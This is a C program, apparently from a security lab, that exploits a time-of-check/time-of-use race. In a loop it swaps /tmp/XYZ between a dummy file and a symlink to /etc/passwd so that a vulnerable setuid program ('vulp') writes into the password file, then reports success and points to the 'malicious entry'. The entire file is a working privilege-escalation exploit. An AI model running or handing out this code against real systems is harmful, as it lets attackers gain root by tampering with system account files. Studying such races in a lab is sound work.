/* attack_fixed.c - Fixed race condition exploit */
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <time.h>

volatile int running = 1;

void handler(int sig) {
    running = 0;
    printf("\n[!] Attack interrupted by user\n");
}

int create_dummy_file() {
    int fd = open("/tmp/XYZ", O_CREAT | O_WRONLY | O_TRUNC, 0666);
    if (fd < 0) {
        return -1;
    }
    write(fd, "dummy\n", 6);
    close(fd);
    return 0;
}

int main() {
    signal(SIGINT, handler);
    
    printf("=== Fixed Race Condition Attack ===\n");
    printf("Target: /tmp/XYZ -> /etc/passwd\n");
    printf("Press Ctrl+C to stop\n\n");
    
    int attempts = 0;
    time_t start_time = time(NULL);
    
    // Create initial dummy file
    if (create_dummy_file() < 0) {
        printf("Error: Cannot create initial file in /tmp\n");
        return 1;
    }
    
    printf("[+] Initial dummy file created\n");
    printf("[+] Starting attack loop...\n");
    
    while(running && attempts < 50000) {
        attempts++;
        
        // Phase 1: Create normal file (so access() succeeds)
        unlink("/tmp/XYZ");
        if (create_dummy_file() < 0) {
            continue;
        }
        
        // Small delay to let vulp start and do access() check
        usleep(500);
        
        // Phase 2: Quick switch to symlink during the delay window
        unlink("/tmp/XYZ");
        if (symlink("/etc/passwd", "/tmp/XYZ") < 0) {
            // If symlink fails, recreate dummy file for next iteration
            create_dummy_file();
            continue;
        }
        
        // Give vulp time to open the symlink
        usleep(2000);
        
        // Check if attack succeeded by looking at /etc/passwd
        struct stat st;
        if (stat("/etc/passwd", &st) == 0) {
            // Simple check: if passwd file was modified recently
            time_t now = time(NULL);
            if (now - st.st_mtime < 2) {
                printf("\n[SUCCESS] Attack may have succeeded!\n");
                printf("Attempts: %d\n", attempts);
                printf("Time elapsed: %ld seconds\n", now - start_time);
                printf("Check /etc/passwd for malicious entry\n");
                break;
            }
        }
        
        // Progress indicator
        if (attempts % 100 == 0) {
            printf("Attempts: %d (%.1f/sec)\r", 
                   attempts, 
                   (double)attempts / (time(NULL) - start_time + 1));
            fflush(stdout);
        }
        
        // Reset for next attempt
        unlink("/tmp/XYZ");
        usleep(1000);
    }
    
    // Cleanup
    unlink("/tmp/XYZ");
    printf("\n[+] Attack finished\n");
    printf("Total attempts: %d\n", attempts);
    printf("Duration: %ld seconds\n", time(NULL) - start_time);
    
    return 0;
}